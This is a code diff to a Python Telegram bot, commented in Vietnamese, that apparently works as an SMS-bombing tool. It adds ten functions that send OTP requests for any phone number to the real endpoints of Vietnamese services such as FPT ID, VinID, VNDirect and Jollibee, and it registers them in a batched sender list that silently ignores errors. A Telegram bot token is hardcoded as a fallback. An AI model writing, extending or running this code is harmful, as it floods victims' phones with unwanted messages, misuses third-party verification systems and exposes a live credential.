@@ -15,7 +15,7 @@ import requests
 # CONFIG - ĐIỀU CHỈNH CHO PHÙ HỢP VỚI MÁY TÍNH
 TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '8669337116:AAGo6urkWzXSb0vWUWlpVytf2DJiF932pYI')
 if not TOKEN or ':' not in TOKEN:
-    raise ValueError("Thiếu hoặc sai TELEGRAM_BOT_TOKEN")
+    raise ValueError("Thieu hoac sai TELEGRAM_BOT_TOKEN")
 
 bot = telebot.TeleBot(TOKEN)
 
@@ -875,6 +875,150 @@ def send_otp_via_paynet(phone: str):
     except:
         pass
 
+def send_otp_via_trungsoncare(phone: str):
+    try:
+        session = get_session()
+        data = {
+            'func': 'getotp',
+            'user_type': 'sms',
+            'read_policy': '1',
+            'ip_code': '84',
+            'user_login': phone,
+        }
+        session.post('https://trungsoncare.com/index.php', params={'dispatch': 'loginbyOTP'}, data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_fptid(phone: str):
+    try:
+        session = get_session()
+        json_data = {
+            'Username': phone,
+            'Challenge': 'd3aa9e431d504ee28d2b3bec42460b5a',
+        }
+        session.post('https://accounts.fpt.vn/sso/partial/username', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vinid(phone: str):
+    try:
+        session = get_session()
+        phone_formatted = '+84' + phone[1:] if phone.startswith('0') else phone
+        json_data = {
+            'phone_number': phone_formatted,
+            'is_register': False,
+        }
+        headers = {
+            'x-channel': 'zUsirVWzboWdAMi',
+            'x-request-id': 'e3adcdb3-bb9c-47f4-8fd8-4dc5772857a4',
+        }
+        session.post('https://apex.vinid.net/oneid/iam/v1/otp/sms/request', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_hasaki(phone: str):
+    try:
+        session = get_session()
+        params = {
+            'api': 'user.verifyUserName',
+            'username': phone,
+        }
+        session.get('https://hasaki.vn/ajax', params=params, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vuihoc(phone: str):
+    try:
+        session = get_session()
+        json_data = {
+            'mobile': phone,
+            'agent_type': 'web',
+            'app_id': 2,
+            'type': 0,
+        }
+        headers = {
+            'app-id': '2',
+            'authorization': 'Bearer',
+            'send-from': 'WEB',
+        }
+        session.post('https://api.vuihoc.vn/api/v2.1/send-otp', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_best_inc(phone: str):
+    try:
+        session = get_session()
+        json_data = {
+            'phoneNumber': phone,
+            'verificationCodeType': 1,
+        }
+        headers = {
+            'authorization': 'null',
+            'lang-type': 'vi-VN',
+            'x-auth-type': 'WEB',
+            'x-lan': 'VI',
+            'x-nat': 'vi-VN',
+            'x-timezone-offset': '7',
+        }
+        session.post('https://v9-cc.800best.com/uc/account/sendsignupcode', json=json_data, headers=headers, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_vndirect(phone: str):
+    try:
+        session = get_session()
+        params = {
+            'template': 'sms_otp_trading_vi',
+            'send': phone,
+            'type': 'PHONE',
+        }
+        session.get('https://id.vndirect.com.vn/authentication/otp/', params=params, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_guardian(phone: str):
+    try:
+        session = get_session()
+        json_data = {'telephone': phone}
+        session.post('https://www.guardian.com.vn/rest/V1/smsOtp/generateOtpForNewAccount', json=json_data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_jollibee(phone: str):
+    try:
+        session = get_session()
+        data = {
+            'success_url': '',
+            'error_url': '',
+            'lastname': 'Nguyen',
+            'firstname': 'Van A',
+            'phone': phone,
+            'email': '',
+            'password': 'Password123@',
+            'password_confirmation': 'Password123@',
+            'dob': '01/01/2000',
+            'gender': '1',
+            'province_customer': '8',
+            'agreement': '1',
+            'otp_type': 'create',
+            'ip': '1.1.1.1',
+        }
+        session.post('https://jollibee.com.vn/otp/action/getOTP', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
+def send_otp_via_hoangphuconline(phone: str):
+    try:
+        session = get_session()
+        data = {
+            'action_type': '1',
+            'tel': phone,
+            'form_key': 'iY9dnL7JVCgtlY40',
+        }
+        session.post('https://hoangphuconline.vn/advancedlogin/otp/CheckValii/', data=data, timeout=REQUEST_TIMEOUT)
+    except:
+        pass
+
 # DANH SÁCH TẤT CẢ CÁC HÀM GỬI
 ALL_SENDERS = [
     ("sapo", send_otp_via_sapo),
@@ -946,6 +1090,16 @@ ALL_SENDERS = [
     ("pico", send_otp_via_pico),
     ("pnj", send_otp_via_PNJ),
     ("tiniworld", send_otp_via_TINIWORLD),
+    ("trungsoncare", send_otp_via_trungsoncare),
+    ("fptid", send_otp_via_fptid),
+    ("vinid", send_otp_via_vinid),
+    ("hasaki", send_otp_via_hasaki),
+    ("vuihoc", send_otp_via_vuihoc),
+    ("best_inc", send_otp_via_best_inc),
+    ("vndirect", send_otp_via_vndirect),
+    ("guardian", send_otp_via_guardian),
+    ("jollibee", send_otp_via_jollibee),
+    ("hoangphuconline", send_otp_via_hoangphuconline),
 ]
 
 # CHIA BATCH
